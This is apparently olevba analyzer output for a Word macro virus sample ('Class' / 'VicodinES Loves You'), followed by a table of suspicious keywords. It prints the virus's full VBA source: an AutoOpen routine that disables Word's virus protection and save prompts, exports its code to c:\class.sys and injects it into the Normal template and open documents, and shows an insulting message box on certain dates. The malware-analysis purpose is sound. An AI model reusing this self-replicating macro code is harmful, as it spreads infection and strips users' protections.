olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-c45b2b88c884384633cdbb82d81332ea95f6a234
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-c45b2b88c884384633cdbb82d81332ea95f6a234 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
On Error GoTo out
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
Options.VirusProtection = False
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
Options.SaveNormalPrompt = False
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
Options.ConfirmConversions = False
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If nt > 70 And ad > 0 Then GoTo out
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If nt < 70 Then
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End If
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
host.codemodule.AddFromFile ("c:\class.sys")
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
With host.codemodule
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    For x = 1 To 4
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    .deletelines 1
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    Next x
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End With
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If nt < 70 Then
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    With host.codemodule
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    .replaceline 1, "Sub AutoClose()"
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    .replaceline 71, "Sub ToolsMacro()"
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    End With
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End If
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
With host.codemodule
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    For x = 2 To 72 Step 2
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
    Next x
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End With
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
out:
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End Sub
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
Sub ViewVBCode()
'anders.bergendahl2000-12-06 13:03:59\\PRINT_SERVER\Datortorg on NE00:Introduction.doc
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

